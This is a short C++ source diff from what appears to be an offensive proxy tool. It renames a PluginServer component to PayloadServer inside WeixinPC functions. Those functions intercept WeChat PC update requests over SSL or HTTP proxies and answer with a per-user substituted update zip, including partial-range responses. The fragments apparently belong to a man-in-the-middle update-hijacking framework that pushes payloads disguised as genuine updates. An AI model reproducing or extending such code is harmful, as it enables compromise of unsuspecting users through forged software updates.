@@ -1,7 +1,7 @@
 #include "WeixinPC.h"
 #include "../cipher/CryptoUtils.h"
 #include "sslPublic.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../HttpUtils.h"
 #include "../Public.h"
 #include "../FileOper.h"
@@ -84,7 +84,7 @@ int WeixinPC::sendWxPCUpdate(char * lpbuffer,int buflimit, LPSSLPROXYPARAM pstSS
 
 		string filename = Public::getUserUrl(pstSSLProxyParam->username, WEIXIN_PC_UPDATE_ZIP_FILENAME);
 
-		int ret = PluginServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespFormat, 1);
 		return 0;
 	}
 
@@ -115,10 +115,10 @@ int WeixinPC::sendWxPCUpdate(const char * url, const char * szdm, const char * h
 		int startno = atoi(start.c_str());
 		int endno = atoi(end.c_str());
 
-		ret = PluginServer::SendPluginFile(filename.c_str(), pstHttpProxyParam, szHttpPartialFormat, startno, endno, 1);
+		ret = PayloadServer::SendPluginFile(filename.c_str(), pstHttpProxyParam, szHttpPartialFormat, startno, endno, 1);
 	}
 	else {
-		ret = PluginServer::SendPluginFile(filename.c_str(), pstHttpProxyParam, szHttpRespHdrFormat, 1);
+		ret = PayloadServer::SendPluginFile(filename.c_str(), pstHttpProxyParam, szHttpRespHdrFormat, 1);
 	}
 
 	return TRUE;
